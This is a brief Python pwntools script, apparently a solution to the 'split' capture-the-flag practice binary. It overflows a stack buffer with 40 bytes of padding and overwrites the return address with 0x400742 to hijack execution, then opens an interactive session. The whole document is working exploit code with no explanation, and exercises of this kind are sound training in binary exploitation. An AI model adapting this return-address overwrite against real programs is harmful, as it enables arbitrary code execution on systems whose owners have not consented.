from pwn import *

p = process('./split')

payload = b'A'*40 + p64(0x0000000000400742)

p.recvuntil(b'> ')
p.send(payload)

p.interactive()
